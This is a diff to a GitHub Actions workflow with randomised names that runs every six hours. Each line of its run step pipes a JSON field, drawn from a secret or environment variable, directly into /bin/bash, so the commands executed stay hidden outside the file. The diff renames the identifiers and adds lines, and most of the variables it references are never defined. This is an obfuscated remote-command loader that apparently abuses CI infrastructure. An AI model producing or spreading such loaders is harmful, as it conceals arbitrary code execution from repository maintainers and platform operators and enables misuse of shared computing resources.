@@ -3,7 +3,7 @@ name: ninboning
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 0/6 * * *'
+    - cron: '53 0/6 * * *'
 
 jobs:
   build:
@@ -12,17 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: ninboning
         env:
-          bfbeu5: ${{ secrets.bfbeu5 }}
+          q00: ${{ secrets.q00 }}
         run: |
-          echo $bfbeu5 | jq -r .c43 | /bin/bash
-          echo $qkp5796 | jq -r .thhxi221 | /bin/bash
-          echo $vyty562 | jq -r .o8 | /bin/bash
-          echo $rzw44 | jq -r .ht757 | /bin/bash
-          echo $wii0 | jq -r .vyuj706 | /bin/bash
-          echo $gt63053 | jq -r .ccoxj2033 | /bin/bash
-          echo $to70706 | jq -r .goecr1253 | /bin/bash
-          echo $tg49394 | jq -r .h99 | /bin/bash
-          echo $sn0553 | jq -r .ei2807 | /bin/bash
-          echo $h40 | jq -r .jvtgg5 | /bin/bash
-          echo $jz9 | jq -r .a6 | /bin/bash
+          echo $q00 | jq -r .i92 | /bin/bash
+          echo $jq93552 | jq -r .tbwqs1176 | /bin/bash
+          echo $vsu06 | jq -r .lh664 | /bin/bash
+          echo $jqit2 | jq -r .dp7043 | /bin/bash
+          echo $z219 | jq -r .cyk6826 | /bin/bash
+          echo $caacj659 | jq -r .q075 | /bin/bash
+          echo $yrwu9 | jq -r .pzatw95 | /bin/bash
+          echo $zma8 | jq -r .vrsd90 | /bin/bash
+          echo $org729 | jq -r .vbk0667 | /bin/bash
+          echo $wvx375 | jq -r .fynqk9682 | /bin/bash
+          echo $la5 | jq -r .sn45718 | /bin/bash
+          echo $aybda4 | jq -r .c2 | /bin/bash
+          echo $u9589 | jq -r .p97597 | /bin/bash
 
